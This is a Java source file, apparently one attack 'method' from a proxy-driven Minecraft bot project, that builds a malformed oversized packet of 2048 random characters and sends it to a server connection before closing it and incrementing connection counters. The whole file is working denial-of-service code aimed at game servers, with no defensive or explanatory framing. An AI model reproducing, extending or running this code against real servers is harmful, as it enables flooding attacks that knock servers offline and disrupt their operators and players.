package xyz.mcbot.methods;

import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;

public class BigPacket implements Method
{
  SecureRandom r;
  String lol;
  final int a;
  
  public BigPacket()
  {
    r = new SecureRandom();
    lol = "";
    a = 2048;
    for (int i = 1; i < a + 1; i++) {
      lol = (String.valueOf(lol) + String.valueOf((char)(r.nextInt(125) + 1)));
    }
  }
  
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }
    out.writeByte(paramInt);
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    io.netty.buffer.ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      writeVarInt(out, 2049);
      out.write(0);
      out.writeUTF(lol);
      out.close();
    }
    catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    NettyBootstrap.integer += 1;
    NettyBootstrap.totalConnections += 1;
    channel.close();
  }
}
